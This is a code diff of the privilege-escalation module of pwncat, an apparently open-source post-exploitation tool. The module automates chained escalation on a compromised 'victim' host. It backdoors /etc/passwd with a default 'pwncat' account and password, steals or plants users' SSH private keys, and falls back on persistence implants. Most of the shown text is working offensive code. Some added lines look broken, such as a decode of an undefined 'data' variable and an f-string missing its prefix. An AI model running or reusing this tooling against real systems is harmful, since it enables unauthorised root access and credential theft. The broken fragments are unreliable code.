@@ -1,30 +1,24 @@
 #!/usr/bin/env python3
-import ipaddress
-from typing import Type, List, Tuple, Optional
-from prompt_toolkit.shortcuts import confirm
-from colorama import Fore
 import crypt
-import time
-import socket
-from pprint import pprint
-import re
+import dataclasses
+import ipaddress
 import os
+import pkgutil
+import time
+from typing import List, Tuple, Optional, Any
+
+from colorama import Fore
+from prompt_toolkit.shortcuts import confirm
 
 import pwncat
-from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod
-from pwncat.privesc.setuid import SetuidMethod
-from pwncat.privesc.sudo import SudoMethod
-from pwncat.privesc.dirtycow import DirtycowMethod
-from pwncat.privesc.screen import ScreenMethod
-from pwncat import downloader
-from pwncat.gtfobins import Capability
 from pwncat import util
+from pwncat.enumerate.private_key import PrivateKeyFact
+from pwncat.file import RemoteBinaryPipe
+from pwncat.gtfobins import Capability
 
 
-# privesc_methods = [SetuidMethod, SuMethod]
-# privesc_methods = [SuMethod, SudoMethod, SetuidMethod, DirtycowMethod, ScreenMethod]
-privesc_methods = [SuMethod, SudoMethod, SetuidMethod]
-# privesc_methods = [SuMethod, SudoMethod]
+class PrivescError(Exception):
+    """ An error occurred while attempting a privesc technique """
 
 
 class Finder:
@@ -37,20 +31,35 @@ class Finder:
     DEFAULT_BACKDOOR_NAME = "pwncat"
     DEFAULT_BACKDOOR_PASS = "pwncat"
 
-    def __init__(self,):
+    def __init__(self):
         """ Create a new privesc finder """
 
         # A user we added_lines which has UID=0 privileges
         self.backdoor_user = None
-        self.methods: List[Method] = []
-        for m in privesc_methods:
+        self.methods: List["BaseMethod"] = []
+
+        # Load all the methods under this directory
+        self.load_package(__path__)
+
+    def load_package(self, path: list):
+
+        for loader, module_name, is_pkg in pkgutil.walk_packages(path):
+            method_module = loader.find_module(module_name).load_module(module_name)
+
+            if is_pkg:
+                continue
+
+            if getattr(method_module, "Method", None) is None:
+                # This isn't a privesc method. It shouldn't be in this directory
+                continue
+
             try:
-                m.check(pwncat.victim)
-                self.methods.append(m(pwncat.victim))
+                method_module.Method.check()
+                self.methods.append(method_module.Method())
             except PrivescError:
                 pass
 
-    def search(self, target_user: str = None) -> List[Technique]:
+    def search(self, target_user: str = None) -> List["Technique"]:
         """ Search for privesc techniques for the current user to get to the
         target user. If target_user is not specified, all techniques for all
         users will be returned. """
@@ -120,7 +129,7 @@ class Finder:
         safe: bool = True,
         target_user: str = None,
         depth: int = None,
-        chain: List[Technique] = [],
+        chain: List["Technique"] = [],
         starting_user=None,
     ):
 
@@ -145,6 +154,11 @@ class Finder:
 
         # Enumerate escalation options for this user
         user_map = {}
+        try:
+            data_printable = data.decode("utf-8").isprintable()
+        except UnicodeDecodeError:
+            data_printable = False
+
         for method in self.methods:
             try:
                 found_techniques = method.enumerate(Capability.ALL)
@@ -194,7 +208,7 @@ class Finder:
         filename: str,
         target_user: str = None,
         depth: int = None,
-        chain: List[Technique] = [],
+        chain: List["Technique"] = [],
         starting_user=None,
     ):
 
@@ -208,7 +222,9 @@ class Finder:
             or current_user.name == "root"
         ):
             pipe = pwncat.victim.open(filename, "rb")
-            return pipe, chain
+            # this also offers the technique used:
+            # escalate to user w/ shell & read normally
+            return pipe, chain, chain[-1][0]
 
         if starting_user is None:
             starting_user = current_user
@@ -227,7 +243,7 @@ class Finder:
                     ):
                         try:
                             read_pipe = tech.method.read_file(filename, tech)
-                            return (read_pipe, chain)
+                            return (read_pipe, chain, tech)
                         except PrivescError:
                             pass
                     if tech.user not in user_map:
@@ -262,14 +278,22 @@ class Finder:
         raise PrivescError(f"no route to {target_user} found")
 
     def escalate_single(
-        self, techniques: List[Technique], shlvl: str
-    ) -> Tuple[Optional[Technique], str]:
+        self, techniques: List["Technique"], shlvl: str
+    ) -> Tuple[Optional["Technique"], str]:
         """ Use the given list of techniques to escalate to the user. All techniques
         should be for the same user. This method will attempt a variety of privesc
         methods. Primarily, it will directly execute any techniques which provide
         the SHELL capability first. Afterwards, it will try to backdoor /etc/passwd
         if the target user is root. Lastly, it will try to escalate using a local
-        SSH server combined with READ/WRITE capabilities to gain a local shell. """
+        SSH server combined with READ/WRITE capabilities to gain a local shell.
+
+        This is, by far, the most disgusting function in all of `pwncat`. I'd like
+        to clean it up, but I'm not sure how to break this up. It's all one continuous
+        line of logic. It's meant to implement all possible privilege escalation methods
+        for one user given a list of techniques for that user. The largest chunk of this
+        is the SSH part, which needs to check that SSH exists, then try various methods
+        to either leak or write private keys for the given user.
+        """
 
         readers: List[Technique] = []
         writers: List[Technique] = []
@@ -277,23 +301,24 @@ class Finder:
         for technique in techniques:
             if Capability.SHELL in technique.capabilities:
                 try:
+                    util.progress(f"attempting {technique}")
 
                     # Attempt our basic, known technique
-                    shlvl = pwncat.victim.getenv("SHLVL")
                     exit_script = technique.method.execute(technique)
                     pwncat.victim.flush_output(some=True)
 
                     # Reset the terminal to ensure we are stable
                     time.sleep(0.1)  # This seems inevitable for some privescs...
-                    pwncat.victim.reset()
+                    pwncat.victim.reset(hard=False)
 
                     # Check that we actually succeeded
-                    current = pwncat.victim.whoami()
+                    current = pwncat.victim.update_user()
 
                     if current == technique.user or (
                         technique.user == pwncat.victim.config["backdoor_user"]
                         and current == "root"
                     ):
+                        util.progress(f"{technique} succeeded!")
                         pwncat.victim.flush_output()
                         return technique, exit_script
 
@@ -310,7 +335,9 @@ class Finder:
                         # Clean up whatever mess was left over
                         pwncat.victim.flush_output()
 
-                        pwncat.victim.reset()
+                        pwncat.victim.reset(hard=False)
+
+                        shlvl = pwncat.victim.getenv("SHLVL")
 
                     # The privesc didn't work, but didn't throw an exception.
                     # Continue on as if it hadn't worked.
@@ -378,52 +405,18 @@ class Finder:
 
                     return writer, "exit"
 
-        util.progress(f"checking for local {Fore.RED}sshd{Fore.RESET} server")
-
-        if len(writers) == 0 and len(readers) == 0:
-            raise PrivescError("no readers and no writers. ssh privesc impossible")
-
-        # Check if there is an SSH server running
         sshd_running = False
-        ps = pwncat.victim.which("ps")
-        if ps is not None:
-            sshd_running = (
-                b"sshd" in pwncat.victim.subprocess("ps -o command -e", "r").read()
-            )
-        else:
-            pgrep = pwncat.victim.which("pgrep")
-            if pgrep is not None:
-                sshd_running = (
-                    pwncat.victim.subprocess("pgrep 'sshd'", "r").read().strip() != b""
-                )
+        for fact in pwncat.victim.enumerate.iter("system.service"):
+            util.progress("enumerating services: {fact.data}")
+            if "sshd" in fact.data.name and fact.data.state == "running":
+                sshd_running = True
 
-        try:
-            with pwncat.victim.open("/proc/net/tcp", "r") as filp:
-                for line in filp.readlines()[1:]:
-                    line = line.strip().split()
-                    local_addr = line[1].split(":")
-                    remote_addr = line[2].split(":")
-                    local_addr = (
-                        (int(local_addr[0], 16)),
-                        (int(local_addr[1], 16)),
-                    )
-                    remote_addr = (
-                        (int(remote_addr[0], 16)),
-                        (int(remote_addr[1], 16)),
-                    )
-                    # Found the SSH socket! Save the listening address
-                    if local_addr[1] == 22 and remote_addr[0] == 0:
-                        sshd_listening = True
-                        sshd_address = str(ipaddress.ip_address(local_addr[0]))
-                        break
-                else:
-                    # We didn't find an SSH socket
-                    sshd_listening = False
-                    sshd_address = None
-        except (PermissionError, FileNotFoundError, IndexError):
-            # We couldn't verify one way or the other, just try it
+        if sshd_running:
             sshd_listening = True
-            sshd_address = "0.0.0.0"
+            sshd_address = "127.0.0.1"
+        else:
+            sshd_listening = False
+            sshd_address = None
 
         used_technique = None
 
@@ -529,6 +522,17 @@ class Finder:
                         # file so this is safe.
                         privkey = privkey.replace("\r\n", "\n")
 
+                        # Ensure we remember that we found this user's private key!
+                        pwncat.victim.enumerate.add_fact(
+                            "private_key",
+                            PrivateKeyFact(
+                                pwncat.victim.users[reader.user].id,
+                                privkey_path,
+                                privkey,
+                            ),
+                            "pwncat.privesc.Finder",
+                        )
+
                         used_technique = reader
 
                         break
@@ -632,9 +636,9 @@ class Finder:
         self,
         target_user: str = None,
         depth: int = None,
-        chain: List[Technique] = None,
+        chain: List["Technique"] = None,
         starting_user=None,
-    ) -> List[Tuple[Technique, str]]:
+    ) -> List[Tuple["Technique", str]]:
         """ Search for a technique chain which will gain access as the given 
         user. """
 
@@ -672,8 +676,11 @@ class Finder:
             # Attempt to escalate with the local persistence method
             if persist.escalate(target_user):
 
+                # Stabilize the terminal
+                pwncat.victim.reset(hard=False)
+
                 # The method thought it worked, but didn't appear to
-                if pwncat.victim.whoami() != target_user:
+                if pwncat.victim.update_user() != target_user:
                     if pwncat.victim.getenv("SHLVL") != shlvl:
                         pwncat.victim.run("exit", wait=False)
                     continue
@@ -697,25 +704,14 @@ class Finder:
             except PrivescError:
                 pass
 
-        if (
-            target_user == "root"
-            and pwncat.victim.config["backdoor_user"] in techniques
-        ):
-            try:
-                tech, exit_command = self.escalate_single(
-                    techniques[pwncat.victim.config["backdoor_user"]], shlvl
-                )
-                chain.append((tech, exit_command))
-                return chain
-            except PrivescError:
-                pass
-
         # Try to escalate directly to the target if possible
         if target_user in techniques:
             try:
                 tech, exit_command = self.escalate_single(
                     techniques[target_user], shlvl
                 )
+                pwncat.victim.reset(hard=False)
+                pwncat.victim.update_user()
                 chain.append((tech, exit_command))
                 return chain
             except PrivescError:
@@ -730,12 +726,17 @@ class Finder:
                 f"checking local persistence implants: {persist.format(user)}"
             )
             if persist.escalate(user):
-                if pwncat.victim.whoami() != user:
+
+                # Ensure history and prompt are correct
+                pwncat.victim.reset()
+
+                # Update the current user
+                if pwncat.victim.update_user() != user:
                     if pwncat.victim.getenv("SHLVL") != shlvl:
                         pwncat.victim.run("exit", wait=False)
                     continue
 
-                chain.append((f"persistence - {persist.format(target_user)}", "exit"))
+                chain.append((f"persistence - {persist.format(user)}", "exit"))
 
                 try:
                     return self.escalate(target_user, depth, chain, starting_user)
@@ -757,6 +758,8 @@ class Finder:
             try:
                 tech, exit_command = self.escalate_single(techs, shlvl)
                 chain.append((tech, exit_command))
+                pwncat.victim.reset(hard=False)
+                pwncat.victim.update_user()
             except PrivescError:
                 continue
             try:
@@ -768,14 +771,14 @@ class Finder:
 
         raise PrivescError(f"no route to {target_user} found")
 
-    def in_chain(self, user: str, chain: List[Tuple[Technique, str]]) -> bool:
+    def in_chain(self, user: str, chain: List[Tuple["Technique", str]]) -> bool:
         """ Check if the given user is in the chain """
         for link in chain:
             if link[0].user == user:
                 return True
         return False
 
-    def unwrap(self, techniques: List[Tuple[Technique, str]]):
+    def unwrap(self, techniques: List[Tuple["Technique", str]]):
         # Work backwards to get back to the original shell
         for technique, exit in reversed(techniques):
             pwncat.victim.run(exit, wait=False)
@@ -784,3 +787,134 @@ class Finder:
 
         # Reset the terminal to get to a sane prompt
         pwncat.victim.reset()
+
+
+@dataclasses.dataclass
+class Technique:
+    """
+    An individual technique which was found to be possible by a privilege escalation
+    method.
+
+    :param user: the user this technique provides access as
+    :param method: the method this technique is associated with
+    :param ident: method-specific identifier
+    :param capabilities: a GTFObins capability this technique provides
+    """
+
+    # The user that this technique will move to
+    user: str
+    """ The user this technique provides access as """
+    # The method that will be used
+    method: "BaseMethod"
+    """ The method which this technique is associated with """
+    # The unique identifier for this method (can be anything, specific to the
+    # method)
+    ident: Any
+    """ Method specific identifier. This can be anything the method needs
+    to identify this specific technique. It can also be unused. """
+    # The GTFObins capabilities required for this technique to work
+    capabilities: Capability
+    """ The GTFOBins capabilities this technique provides. """
+
+    def __str__(self):
+        cap_names = {
+            "READ": "file read",
+            "WRITE": "file write",
+            "SHELL": "shell",
+        }
+        return (
+            f"{Fore.MAGENTA}{cap_names.get(self.capabilities.name, 'unknown')}{Fore.RESET} "
+            f"as {Fore.GREEN}{self.user}{Fore.RESET} via {self.method.get_name(self)}"
+        )
+
+
+class BaseMethod:
+    """
+    Generic privilege escalation method. You must implement at a minimum the enumerate
+    method. Also, for any capabilities which you are capable of generating techniques for,
+    you must implement the corresponding methods:
+
+    * ``Capability.SHELL`` - ``execute``
+    * ``Capability.READ`` - ``read_file``
+    * ``Capability.WRITE`` - ``write_file``
+
+    Further, you can also implement the ``check`` class method to verify applicability of
+    this method to the remote victim and the ``get_name`` method to generate a printable
+    representation of a given technique for this method (as seen in ``privesc`` output).
+    """
+
+    # Binaries which are needed on the remote host for this privesc
+    name = "unknown"
+    """ Name of this method """
+    BINARIES = []
+    """ List of binaries to verify presence in the default ``check`` method """
+
+    @classmethod
+    def check(cls) -> bool:
+        """ Check if the given PTY connection can support this privesc """
+        for binary in cls.BINARIES:
+            if pwncat.victim.which(binary) is None:
+                raise PrivescError(f"required remote binary not found: {binary}")
+
+    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
+        """
+        Enumerate all possible techniques known and possible on the remote host for
+        this method. This should only enumerate techniques with overlapping capabilities
+        as specified by the ``capability`` parameter.
+
+        :param capability: the requested capabilities to enumerate
+        :return: A list of potentially working techniques
+        """
+        raise NotImplementedError("no enumerate method implemented")
+
+    def execute(self, technique: Technique) -> bytes:
+        """
+        Execute the given technique to gain a shell. This is only called for techniques
+        providing the Capability.SHELL capability. If there is a problem with escalation,
+        the shell should be returned to normal and a ``PrivescError`` should be raised.
+
+        :param technique: the technique to execute
+        :return: a bytes object which will exit the new shell
+        """
+        raise NotImplementedError("no execute method implemented")
+
+    def read_file(self, filename: str, technique: Technique) -> RemoteBinaryPipe:
+        """
+        Open the given file for reading and return a file-like object, as the user
+        specified in the technique. This is only called for techniques providing the
+        Capability.READ capability. If an error occurs, a ``PrivescError`` should be
+        raised with a description of the problem.
+
+        :param filename: path to the remote file
+        :param technique: the technique to utilize
+        :return: Binary file-like object representing the remote file
+        """
+        raise NotImplementedError("no read_file implementation")
+
+    def write_file(self, filename: str, data: bytes, technique: Technique):
+        """
+        Write the data to the given filename on the remote host as the user
+        specified in the technique. This is only called for techniques providing the
+        Capability.WRITE capability. If an error occurs, ``PrivescError`` should
+        be raised with a description of the problem.
+
+        This will overwrite the remote file if it exists!
+
+        :param filename: the remote file name to write
+        :param data: the data to write
+        :param technique: the technique to user
+        """
+        raise NotImplementedError("no write_file implementation")
+
+    def get_name(self, tech: Technique) -> str:
+        """
+        Generate a human-readable and formatted name for this method/technique
+        combination.
+
+        :param tech: a technique applicable to this object
+        :return: a formatted string
+        """
+        return str(self)
+
+    def __str__(self):
+        return f"{Fore.RED}{self.name}{Fore.RESET}"
